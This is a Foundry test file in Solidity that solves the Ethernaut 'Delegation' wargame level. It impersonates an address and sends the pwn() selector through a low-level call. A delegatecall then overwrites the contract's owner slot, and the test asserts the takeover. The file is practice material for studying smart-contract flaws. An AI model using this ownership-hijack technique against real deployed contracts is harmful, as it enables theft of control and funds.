// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/openzeppelin-ethernaut/Delegation.sol";

// call pwn() on Delegate for delegatecall updates the storage on the first slot of Delegation
contract DelegationTest is Test {
    Delegate delegate;
    Delegation delegation;

    function setUp() public {
        delegate = new Delegate(address(this));
        delegation = new Delegation(address(delegate));
    }

    function test() public {
        assertEq(delegate.owner(), address(this));
        assertEq(delegation.owner(), address(this));

        address alice = makeAddr("alice");
        vm.startPrank(alice);
        bytes memory data = abi.encodeWithSelector(Delegate.pwn.selector);
        console.logBytes(data);
        address(delegation).call(data);

        assertEq(delegate.owner(), address(this));
        assertEq(delegation.owner(), alice);

        delegate.pwn();

        assertEq(delegate.owner(), alice);
        assertEq(delegation.owner(), alice);
    }
}
